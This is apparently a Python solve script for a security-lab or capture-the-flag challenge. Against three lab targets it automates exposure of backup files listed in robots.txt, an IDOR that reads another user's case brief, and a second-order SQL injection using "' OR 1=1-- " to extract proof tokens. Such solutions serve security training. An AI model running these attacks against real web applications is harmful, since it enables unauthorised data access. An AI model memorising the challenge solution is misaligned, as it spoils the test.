#!/usr/bin/env python3
"""Ask Again Later / mastery: per-target classifiers for the three mixed bug
classes observed. Call classify_and_recover(base_url) and it dispatches to the
matching class based on live evidence (never by target array order).

Usage: python3 -I solve.py <target1_base> <target2_base> <target3_base>
Only ever talks to the three target origins passed on argv. No GM calls.
"""
import http.cookiejar
import json
import re
import sys
import time
import urllib.error
import urllib.request

UA = "ask-again-later-mastery/1.0"


def _client(base, cookie_jar=None):
    opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cookie_jar)) if cookie_jar is not None else urllib.request.build_opener()

    def req(path, method="GET", data=None):
        headers = {"User-Agent": UA, "Accept": "application/json"}
        body = None
        if data is not None:
            headers["Content-Type"] = "application/json"
            body = json.dumps(data).encode()
        r = urllib.request.Request(base.rstrip("/") + path, data=body, headers=headers, method=method)
        try:
            with opener.open(r, timeout=20) as resp:
                return resp.status, resp.read().decode("utf-8", "replace")
        except urllib.error.HTTPError as e:
            return e.code, e.read().decode("utf-8", "replace")
        except Exception as e:  # noqa: BLE001
            return None, f"ERR {e!r}"

    return req


def rec_backup_exposure(base):
    """robots.txt Disallow -> open directory listing -> named backup file."""
    req = _client(base)
    st, robots = req("/robots.txt")
    m = re.search(r"Disallow:\s*(/\S+)", robots)
    if not m:
        return None
    directory = m.group(1)
    time.sleep(0.7)
    st, listing = req(directory)
    if st != 200:
        return None
    files = re.findall(r'href="([^"]+\.(?:bak|json\.bak|txt|json))"', listing)
    for f in files:
        time.sleep(0.7)
        st, body = req(f if f.startswith("/") else directory.rstrip("/") + "/" + f)
        m2 = re.search(r"proof_[0-9a-f]+", body)
        if m2:
            return m2.group(0)
    return None


def rec_idor(base):
    """Root establishes a session; activity feed discloses a foreign case id;
    the case viewer's inline fetch reveals the real API template."""
    cj = http.cookiejar.CookieJar()
    req = _client(base, cj)
    req("/")
    time.sleep(0.7)
    st, events = req("/api/events")
    if st != 200:
        return None
    data = json.loads(events)
    me = data.get("current_user")
    foreign = [e["case_id"] for e in data.get("events", []) if e.get("owner") != me]
    if not foreign:
        return None
    time.sleep(0.7)
    st, body = req(f"/api/briefs/{foreign[0]}")
    m = re.search(r"proof_[0-9a-f]+", body)
    return m.group(0) if m else None


def rec_second_order_sqli(base):
    """POST a 'filter' field with a boolean-OR SQLi payload; GET the clue-given
    secondary_route to see the private row revealed alongside the public one."""
    req = _client(base)
    st, clues = req("/api/clues")
    if st != 200:
        return None
    data = json.loads(clues)
    submit_route = data["feature_route"]
    result_route = data["secondary_route"]
    time.sleep(0.7)
    req(submit_route, method="POST", data={"filter": "' OR 1=1-- "})
    time.sleep(0.7)
    st, body = req(result_route)
    m = re.search(r"proof_[0-9a-f]+", body)
    return m.group(0) if m else None


def classify_and_recover(base):
    req = _client(base)
    st, clues = req("/api/clues")
    if st == 200:
        try:
            data = json.loads(clues)
            if "feature_route" in data and "secondary_route" in data:
                return rec_second_order_sqli(base)
        except json.JSONDecodeError:
            pass
    if st == 401:
        return rec_idor(base)
    time.sleep(0.5)
    st, root = req("/")
    if "api/events" in root or "briefs/" in root:
        return rec_idor(base)
    return rec_backup_exposure(base)


if __name__ == "__main__":
    results = {}
    for i, base in enumerate(sys.argv[1:], start=1):
        results[f"proof-{i}"] = classify_and_recover(base)
        time.sleep(0.7)
    print(json.dumps(results))
